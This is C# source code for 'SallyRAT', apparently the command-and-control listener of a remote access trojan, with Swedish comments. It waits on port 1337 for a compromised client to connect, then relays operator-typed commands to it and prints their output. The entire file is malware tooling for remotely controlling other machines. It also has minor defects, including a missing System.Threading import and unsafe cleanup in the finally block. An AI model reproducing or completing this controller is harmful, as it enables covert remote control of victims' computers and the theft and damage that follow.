using System;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;   
using System.Text;

namespace SallyRAT
{
    class Program
    {
        static void Main(string[] args)
        {

            TcpListener listener = new TcpListener(IPAddress.Any, 1337); // den här raden skapar en lyssnare på port 1337

            listener.Start();

            Console.WriteLine("Listening on port 1337");

            while (true) // den här loopen körs tills programmet stängs av
            {
                TcpClient client2 = null; // här skapar vi variabler för TcpClient, NetworkStream, StreamReader och StreamWriter
                NetworkStream stream2 = null;
                StreamReader reader2 = null;
                StreamWriter writer2 = null;

                try // här försöker vi ansluta till en klient
                {
                    client2 = listener.AcceptTcpClient(); // här accepterar vi en inkommande anslutning
                    stream2 = client2.GetStream(); // här skapar vi en variabel för att skicka och ta emot data
                    reader2 = new StreamReader(stream2); // här skapar vi en variabel för att läsa data
                    writer2 = new StreamWriter(stream2) { AutoFlush = true }; // här skapar vi en variabel för att skriva data

                    Console.WriteLine("Client Connected");

                    Thread.Sleep(1000);

                    while (client2.Connected) // I denna loop skickar vi kommandon till klienten och tar emot output
                    {

                        Console.Write ("SallyRAT> ");
                        string command = Console.ReadLine();

                        if (string.IsNullOrEmpty(command))
                        {
                            continue;
                        }

                        if (command.ToLower() == "exit")
                        {
                            break;

                        }
                        writer2.WriteLine(command);

                        string output;
                        while ((output = reader2.ReadLine()) != null) // Här ser vi till så att den kan outputta all text och inte bara en linje. TEX IPCONFIG 
                        {
                            if (output == "END_OF_OUTPUT")
                            {
                                break;
                            }
                            Console.WriteLine(output);
                        }

                       


                    }
                    
                    Console.WriteLine("Client Disconnected");
                    Console.WriteLine("Listening For New Client");
                }
                catch (Exception e) // Om nåt går åt helvete säger den till vad som gick fel
                {
                    Console.WriteLine(e.Message);
                }
                finally // Stänger alla anslutningar
                {
                    writer2.Close();
                    reader2.Close();
                    stream2.Close();
                    client2.Close();
                }

            }
        }
        
    }
}